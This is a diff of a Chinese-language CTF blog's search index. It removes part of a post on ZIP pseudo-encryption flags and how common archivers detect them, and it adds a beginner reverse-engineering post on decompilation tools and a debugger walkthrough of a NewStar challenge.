目录开始的磁盘编号</span><br><span class="line">    - ushort elEntriesOnDisk # 当前磁盘上的条目数量</span><br><span class="line">    - ushort elEntriesTotal # 总条目数量</span><br><span class="line">    - uint elSizeOfDirectory # 目录的总大小</span><br><span class="line">    - uint elOffsetOfDirectory # 目录开始的偏移位置</span><br><span class="line">    - ushort elCommentLength # 注释长度</span><br><span class="line">    - char elComment[elCommentLength] # 注释</span><br></pre></td></tr></table></figure>
-
-<p>可以发现最重要的就是两个标志位了，他们是判断伪加密的标准</p>
-<p>其实其余部分也很重要，因为如果不对应的话直接解压会发现报错——CRC校验错误</p>
-<p>首先我们要知道</p>
-<blockquote>
-<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：<br>                                             <strong>第二个数字为奇数时 –&gt;加密</strong><br>                                             <strong>第二个数字为偶数时 –&gt;未加密</strong></p>
+    <title>Reverse Record</title>
+    <url>/2024/11/Reverse-Record/</url>
+    <content><![CDATA[<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><h3 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h3><blockquote>
+<p><code>.pyc</code> 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行</p>
+<p>想查看 <code>.pyc</code> 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 <code>.py</code> 文件。</p>
 </blockquote>
-<p>也就是说，0900&#x2F;0100代表着加密，0000&#x2F;0800代表着无加密</p>
-<p>而<strong>伪加密就是把本来无加密的文件修改了标志位从而显示出加密的样子</strong></p>
-<p>那我们怎么修改伪加密呢？为什么有些工具可以直接解压有些却不行呢？</p>
-<h1 id="工具选择"><a href="#工具选择" class="headerlink" title="工具选择"></a>工具选择</h1><h2 id="010editor"><a href="#010editor" class="headerlink" title="010editor"></a>010editor</h2><p>010editor肯定是最普遍和最准确的修改伪加密的东西了</p>
-<p>如果是伪加密的话直接010修改0900为0000</p>
-<p>如果两区（record和dirEntry）都是0900直接全改即可</p>
-<h2 id="bandizip"><a href="#bandizip" class="headerlink" title="bandizip"></a>bandizip</h2><p>经过测试，bandizip识别一个文件是否加密是通过看<strong>dirEntry记录中的deflag位</strong></p>
-<p>如果deFlag位是加密的话无论另一个frflag是否是加密bandizip都会识别为加密</p>
-<h2 id="winRAR"><a href="#winRAR" class="headerlink" title="winRAR"></a>winRAR</h2><p>winRAR和bandizip一样，都是识别dirEntry记录中的deflag位</p>
-<h2 id="7zip"><a href="#7zip" class="headerlink" title="7zip"></a>7zip</h2><p>7z就很神奇，它与上面两个工具不同。</p>
-<p><strong>7zip判断是否为加密的方式是看record记录中的frflag位</strong></p>
-<p>因此有些明明是伪加密的zip 7z却能直接解压</p>
-<p>所以那句“不会出的出题人只修改一个struct区”是因为换个工具就能解压</p>
-<h2 id="随波逐流"><a href="#随波逐流" class="headerlink" title="随波逐流"></a>随波逐流</h2><p>经过测试，随波逐流提供的伪加密修复<strong>只会修改dirEntry记录中的deflag位</strong>，而不管frFlag位</p>
-<h2 id="ZipCenOp"><a href="#ZipCenOp" class="headerlink" title="ZipCenOp"></a>ZipCenOp</h2><p><strong>不好用！！</strong></p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ZipCenOp.jar -r 111.zip</span><br></pre></td></tr></table></figure>
-
-<p>会显示</p>
-<p>success 1 flag(s) found</p>
-<p>但是它不帮我改，有啥用？。。</p>
-<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>传闻2345好压改两个区也能直接开。而且还有360解压缩</p>
-<p>然而我不敢尝试，怕删不干净。。</p>
+<p>-使用 uncompyle6</p>
+<p>-在线网站 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
+<h3 id="exe反编译"><a href="#exe反编译" class="headerlink" title="exe反编译"></a>exe反编译</h3><p>使用IDA</p>
+<h3 id="apk反编译"><a href="#apk反编译" class="headerlink" title="apk反编译"></a>apk反编译</h3><p>使用jadx-gui-1.4.4-no-jre-win.exe</p>
+<h1 id="NewStar-re复现"><a href="#NewStar-re复现" class="headerlink" title="NewStar-re复现"></a><strong>NewStar-re复现</strong></h1><p><strong>学MISC果然还是要带点其他领域，那就学点RE吧！而RE的入门还是觉得NewStar好，不会了还有WP看（bushi</strong></p>
+<h2 id="1-ez-debug"><a href="#1-ez-debug" class="headerlink" title="1.ez_debug"></a><em>1.ez_debug</em></h2><p>当初不会写是因为这个代码风格我有点看不懂，而且很长加上不怎么会调试所以没写出来。</p>
+<p><img src="re2.png" alt="re2"></p>
+<p>这里我们应该发现decrypted flag应该是输入的flag与加密之后再解密的flag比较<br>注意上面的you函数，步入后看到几个变量，下断点，调试</p>
+<p><img src="re3.png" alt="re3"></p>
+<p>能看得到v5的值在缓慢变化成flag，不断f8单步执行即得到flag</p>
+<p>总结:看到提示后应该多步入函数看看，断点也可以下在函数里。F8单步执行可以缓慢查看变量的变化。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
         <tag>CTF</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
 </search>
